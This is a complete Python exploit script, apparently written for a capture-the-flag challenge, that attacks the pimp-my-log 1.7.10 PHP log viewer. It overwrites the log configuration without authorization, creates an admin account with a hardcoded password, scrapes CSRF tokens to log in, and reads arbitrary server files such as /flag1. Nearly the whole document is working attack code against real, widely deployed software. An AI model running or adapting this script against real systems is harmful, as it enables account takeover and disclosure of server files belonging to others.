#!/usr/bin/env python3
"""
potsky/pimp-my-log 1.7.10 - Arbitrary File Read via Log Configuration
Vulnerability: Unauthorized config overwrite + CSRF bypass + arbitrary file read
Tested on: PHP 7.4.33 and 8.4
"""
import json
import re
import sys
import requests


def exploit(host):
    s = requests.Session()
    base = f"http://{host}"

    # Step 1: Configure /flag1 and /readflag as log files
    s.post(
        f"{base}/vendor/potsky/pimp-my-log/inc/configure.php",
        data="s=configure&l[0][t]=error&l[0][s]=apache&l[0][f]=/flag1&l[1][t]=error&l[1][s]=apache&l[1][f]=/readflag",
        headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=10
    )

    # Step 2: Create admin account to enable sessions/CSRF
    s.post(
        f"{base}/vendor/potsky/pimp-my-log/inc/configure.php",
        data="s=authtouch",
        headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=10
    )
    s.post(
        f"{base}/vendor/potsky/pimp-my-log/inc/configure.php",
        data="s=authsave&u=admin&p=password123456",
        headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=10
    )

    # Step 3: Get CSRF token from login page
    r = s.post(
        f"{base}/vendor/potsky/pimp-my-log/inc/getlog.pml.php",
        data="file=apache1&max=100&ldv=1",
        headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=10
    )
    m = re.search(r'name=["\']csrf_token["\'][^>]*value=["\']([^"\']+)', r.text)
    csrf = m.group(1) if m else None
    m2 = re.search(r'name=["\']attempt["\'][^>]*value=["\']([^"\']+)', r.text)
    attempt = m2.group(1) if m2 else None

    if not csrf or not attempt:
        print("ERROR: Could not obtain CSRF token")
        return

    # Step 4: Sign in with admin credentials
    s.post(
        f"{base}/vendor/potsky/pimp-my-log/inc/getlog.pml.php",
        data={"csrf_token": csrf, "attempt": attempt, "username": "admin", "password": "password123456"},
        headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=10
    )

    # Step 5: Get fresh CSRF from index page
    r2 = s.get(f"{base}/vendor/potsky/pimp-my-log/index.php", timeout=10)
    m = re.search(r'csrf_token.*?([a-f0-9]{32})', r2.text)
    csrf2 = m.group(1) if m else None

    if not csrf2:
        print("ERROR: Could not get fresh CSRF token")
        return

    # Step 6: Read /flag1 and /readflag
    for fid, label in [("apache1", "flag1"), ("apache2", "readflag")]:
        r3 = s.post(
            f"{base}/vendor/potsky/pimp-my-log/inc/getlog.pml.php",
            data=f"file={fid}&max=100&ldv=1&reset=1&csrf_token={csrf2}",
            headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=10
        )
        try:
            data = json.loads(r3.text)
            if 'error' not in data:
                fp = re.search(r'File <code>([^<]+)</code>', data.get('footer', ''))
                filepath = fp.group(1) if fp else '?'
                print(f"{label}: {filepath} ({data.get('filesize')}B)")
                # The content is filtered by log regex, but file is confirmed readable
                if data.get('errorlines', 0) > 0 or data.get('bytes', 0) > 0:
                    print(f"  File confirmed readable, {data.get('bytes')} bytes")
            else:
                print(f"{label}: {data.get('error', '')[:100]}")
        except Exception:
            print(f"{label}: Error parsing response")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <challenge_host>")
        sys.exit(1)
    exploit(sys.argv[1])
